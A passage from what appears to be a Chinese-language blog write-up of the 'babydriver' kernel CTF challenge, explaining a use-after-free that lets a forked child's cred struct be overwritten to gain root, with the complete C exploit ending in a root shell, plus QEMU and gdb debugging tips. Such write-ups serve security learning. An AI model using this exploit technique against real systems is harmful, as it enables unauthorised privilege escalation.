</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>key</span>	<span style=color:#666>*</span>thread_keyring; <span style=color:#60a0b0;font-style:italic>/* keyring private to this thread */</span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>key</span>	<span style=color:#666>*</span>request_key_auth; <span style=color:#60a0b0;font-style:italic>/* assumed request_key authority */</span>
</span></span><span style=display:flex><span><span style=color:#007020>#endif
</span></span></span><span style=display:flex><span><span style=color:#007020>#ifdef CONFIG_SECURITY
</span></span></span><span style=display:flex><span><span style=color:#007020></span>	<span style=color:#902000>void</span>		<span style=color:#666>*</span>security;	<span style=color:#60a0b0;font-style:italic>/* subjective LSM security */</span>
</span></span><span style=display:flex><span><span style=color:#007020>#endif
</span></span></span><span style=display:flex><span><span style=color:#007020></span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>user_struct</span> <span style=color:#666>*</span>user;	<span style=color:#60a0b0;font-style:italic>/* real user ID subscription */</span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>user_namespace</span> <span style=color:#666>*</span>user_ns; <span style=color:#60a0b0;font-style:italic>/* user_ns the caps and keyrings are relative to. */</span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>group_info</span> <span style=color:#666>*</span>group_info;	<span style=color:#60a0b0;font-style:italic>/* supplementary groups for euid/fsgid */</span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>rcu_head</span>	rcu;		<span style=color:#60a0b0;font-style:italic>/* RCU deletion hook */</span>
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>该结构体的大小为 0xa8。所以我们的提权思路就是先打开两次 babydrive 设备，申请一个 0xa8 大小的内核空间，然后把第一个设备释放掉，这样内核空间中就有 0xa8 大小的空闲空间可以被我们完全控制了，然后 fork 一个新进程，这个进程的 cred 结构体就会使用这 0xa8 大小的空间了（此题在此处大幅降低了难度，事实上，一般的 Linux 内核使用的 slab/slub 中 cred 和 kmalloc 是不会共用同一个 slab 的，但是此题的使用的内核两者共用，所以有这么一个很简单的做法），然后在父进程中修改这个结构体的所有 id（最主要的是 euid）为 0 就实现了提权。然后在子进程中调用 sh 即可获得 root shell。</p><p>exp 就是下面这样（照抄的 ctf-wiki）</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;fcntl.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/wait.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/stat.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> device1 <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/babydev&#34;</span>, <span style=color:#40a070>2</span>);
</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> device2 <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/babydev&#34;</span>, <span style=color:#40a070>2</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	ioctl(device1, <span style=color:#40a070>0x10001</span>, <span style=color:#40a070>0xa8</span>);
</span></span><span style=display:flex><span>	close(device1);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> new_process_pid <span style=color:#666>=</span> fork();
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (new_process_pid <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		puts(<span style=color:#4070a0>&#34;[*] fork error&#34;</span>);
</span></span><span style=display:flex><span>		exit(<span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>else</span> <span style=color:#007020;font-weight:700>if</span> (new_process_pid <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		<span style=color:#902000>char</span> lots_zero[<span style=color:#40a070>30</span>] <span style=color:#666>=</span> {<span style=color:#40a070>0</span>};
</span></span><span style=display:flex><span>		write(device2, lots_zero, <span style=color:#40a070>28</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (getuid() <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			puts(<span style=color:#4070a0>&#34;[*] got root&#34;</span>);
</span></span><span style=display:flex><span>			system(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>);
</span></span><span style=display:flex><span>			exit(<span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		wait(<span style=color:#007020>NULL</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	close(device2);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=调试>调试</h3><p>分析完了，再谈怎么调试，首先需要在启动命令中加入 <code>-S -gdb tcp::1234</code>，启动 boot.sh 后，会卡住，在一个新终端中启动 gdb，使用 <code>target remote :1234</code> attach 上去。</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/710345620.png></div><p>然后用 c 指令让 qemu 启动。</p><p>启动之后我们希望能在 babydrive 相关的操作上打个断点，由于 babydrive.ko 保留了符号表，可以直接载入符号表。</p><p>在 sys/moudle 中可以看到各个模块的信息</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/06/1025470266.png></div><p>我们进入 babydriver/section 中，使用 <code>grep 0 .text</code> 来查看代码段的地址</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#666>/</span>sys<span style=color:#666>/</span>module<span style=color:#666>/</span>babydriver<span style=color:#666>/</span>sections <span>$</span> grep <span style=color:#40a070>0</span> .text
</span></span><span style=display:flex><span><span style=color:#40a070>0xffffffffc0000000</span>
</span></span></code></pre></div><p>然后到 gdb 中载入符号表</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>pwndbg<span style=color:#666>&gt;</span> add<span style=color:#666>-</span>symbol<span style=color:#666>-</span>file .<span style=color:#666>/</span>core<span style=color:#666>/</span>lib<span style=color:#666>/</span>modules<span style=color:#666>/</span><span style=color:#40a070>4.4.72</span><span style=color:#666>/</span>babydriver.ko <span style=color:#40a070>0xffffffffc0000000</span>
</span></span><span style=display:flex><span>add symbol table from file <span style=color:#4070a0>&#34;./core/lib/modules/4.4.72/babydriver.ko&#34;</span> at
</span></span><span style=display:flex><span>        .text_addr <span style=color:#666>=</span> <span style=color:#40a070>0xffffffffc0000000</span>
</span></span><span style=display:flex><span>Reading symbols from .<span style=color:#666>/</span>core<span style=color:#666>/</span>lib<span style=color:#666>/</span>modules<span style=color:#666>/</span><span style=color:#40a070>4.4.72</span><span style=color:#666>/</span>babydriver.ko...
</span></span></code></pre></div><p>然后 b babyioctl 即可在 babyioctl 函数上下断了。</p><p>顺便提一下，如果在启动 gdb 时，加载了 vmlinux 的话，也就是这样</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>gdb vmlinux -q
</span></span></code></pre></div><p>启动，可能会非常卡慢，这似乎是 pwndbg 造成的，在 <code>~/.gdbinit</code> 中把 source pwndbg 的那一行注释掉，以裸 gdb 的形式启动会比较流畅。</p><h3 id=参考>参考</h3><blockquote><p><a href=https://ctf-wiki.org/pwn/linux/kernel/kernel_uaf>CTF-WIKI</a></p><p><a href=https://www.freebuf.com/articles/network/227357.html>Pwn In Kernel（一）：基础知识</a></p></blockquote></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/kernel-pwn>kernel-pwn</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/jchu95495236 rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>